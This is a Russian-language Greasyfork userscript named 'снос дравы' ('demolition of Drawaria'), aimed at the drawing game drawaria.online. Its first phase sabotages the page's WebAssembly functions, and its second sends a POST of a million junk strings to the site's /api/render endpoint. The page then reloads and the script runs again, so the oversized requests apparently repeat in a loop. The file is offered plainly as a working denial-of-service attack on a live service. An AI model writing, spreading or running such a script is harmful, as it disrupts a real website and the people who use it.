// ==UserScript==
// @name         снос дравы
// @match        *://drawaria.online/*
// @description  сносер дравы
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @version      0.1CHOC
// @license      𝘣𝘢𝘳𝘴𝘪𝘬
// @namespace https://greasyfork.org/users/1485055
// @downloadURL https://update.greasyfork.org/scripts/544491/%D1%81%D0%BD%D0%BE%D1%81%20%D0%B4%D1%80%D0%B0%D0%B2%D1%8B.user.js
// @updateURL https://update.greasyfork.org/scripts/544491/%D1%81%D0%BD%D0%BE%D1%81%20%D0%B4%D1%80%D0%B0%D0%B2%D1%8B.meta.js
// ==/UserScript==

// Фаза 1: Отключение защиты
const BOMB_PAYLOAD = setInterval(() => {
  if (window.WebAssembly) {
    window.WebAssembly.compile = null;
    window.WebAssembly.instantiate = () => { throw new Error("[⚡] RAGE BOMB DETONATED"); };
    clearInterval(BOMB_PAYLOAD);
  }
}, 100);

// Фаза 2: Физическое воздействие
GM_xmlhttpRequest({
  method: "POST",
  url: "https://drawaria.online/api/render",
  data: JSON.stringify({vectors: Array(1e6).fill("0xDEADBEEF")}),
  headers: {"Content-Type": "application/json"},
  onload: () => location.reload()
});